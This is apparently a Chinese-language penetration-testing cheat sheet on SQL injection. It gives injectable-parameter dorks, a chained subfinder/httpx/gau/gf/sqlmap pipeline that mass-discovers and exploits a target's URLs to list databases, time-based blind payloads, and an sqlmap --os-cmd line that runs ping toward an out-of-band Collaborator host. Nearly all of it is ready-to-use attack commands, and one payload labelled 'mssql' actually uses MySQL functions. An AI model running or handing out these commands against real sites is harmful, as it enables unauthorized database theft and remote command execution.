# SQL注入

## 快速自动化测试注入

`Sqlmap -u https://url/something/*`



## top 10 Dorks

```
1.?id=
2.?cat=
3.?view=
4.?mode=
5.?tid=
6.?product_id=
7.?act=
8.?item_id=
9.?table=
10.?module=
```



## one-line

```
subfinder -d http://target.com > subs
cat subs | httpx > subs.alive
cat subs.alive | gau_go -b jpg,png,gif > urls.check
gf_go sqli urls.check > urls.sqli
sqlmap -m urls.sqli --dbs --batch --random-agent
```

联动

```
cat subs.alive | gau_go -b jpg,png,gif > urls.check && gf_go sqli urls.check > urls.sqli && sqlmap -m urls.sqli --dbs --batch --random-agent
```



## 测试语句

```
select if( table_name like 'x', benchmark(100000,sha1('_Y000!_')), concat(table_name) ) from information_schema.tables
```



mssql

```
'xor(if(now()=sysdate(),sleep(10),0))or'
```



```
1 AND 1726=1726
```



## SQLMAP 语句收集

SQL Server执行命令:

```
sqlmap -r request.txt --force-ssl -p pramater --level 5 --risk 2 -dbms="Microsoft SQL Server" --os-cmd="ping http://your.burpcollaborator.net"
```

